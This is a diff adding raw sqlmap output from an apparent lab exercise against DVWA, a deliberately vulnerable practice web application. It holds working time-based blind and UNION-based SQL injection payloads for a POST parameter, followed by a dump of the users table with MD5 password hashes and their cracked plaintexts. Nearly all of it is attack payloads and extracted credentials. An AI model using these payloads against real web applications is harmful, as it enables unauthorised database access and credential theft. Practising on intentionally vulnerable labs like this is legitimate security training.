@@ -1,0 +1,44 @@
+sqlmap identified the following injection point(s) with a total of 64 HTTP(s) requests:
+---
+Parameter: id (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 5600 FROM (SELECT(SLEEP(5)))gkhK) AND 'IylA'='IylA&Submit=Submit
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x7171627171,0x6455794a566479457a764158654443636c594f6847595346444d4a4465787a55486a4d5a61694458,0x716b6b7171)-- -&Submit=Submit
+---
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+Database: dvwa
+[2 tables]
++-----------+
+| guestbook |
+| users     |
++-----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 5600 FROM (SELECT(SLEEP(5)))gkhK) AND 'IylA'='IylA&Submit=Submit
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x7171627171,0x6455794a566479457a764158654443636c594f6847595346444d4a4465787a55486a4d5a61694458,0x716b6b7171)-- -&Submit=Submit
+---
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
+| user_id | user    | avatar                      | password                                    | last_name | first_name | last_login          | failed_login |
++---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
+| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2020-08-28 15:34:30 | 1            |
+| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2020-08-26 06:01:17 | 0            |
+| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2020-08-26 06:01:17 | 0            |
+| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2020-08-26 06:01:17 | 0            |
+| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2020-08-26 06:01:17 | 0            |
++---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
+
